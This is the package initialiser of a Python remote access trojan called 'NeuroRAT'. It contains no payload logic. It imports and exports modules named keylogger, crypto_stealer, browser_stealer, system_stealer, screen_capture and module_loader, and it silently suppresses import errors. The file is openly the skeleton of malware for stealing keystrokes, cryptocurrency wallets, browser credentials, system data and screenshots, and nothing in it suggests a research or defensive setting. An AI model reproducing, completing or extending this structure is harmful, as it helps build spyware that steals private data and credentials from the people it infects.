"""
NeuroRAT Agent Modules Package
------------------------------
This package contains extension modules for the NeuroRAT agent.
"""

__version__ = "1.0.0"
__author__ = "Mr. Thomas Anderson"

# Import modules for easier access
try:
    from . import keylogger
    from . import crypto_stealer
    from . import browser_stealer
    from . import system_stealer
    from . import screen_capture
    from . import swarm_intelligence
    from . import module_loader
except ImportError as e:
    pass

__all__ = [
    'keylogger', 
    'crypto_stealer', 
    'browser_stealer', 
    'system_stealer', 
    'screen_capture', 
    'swarm_intelligence',
    'module_loader'
] 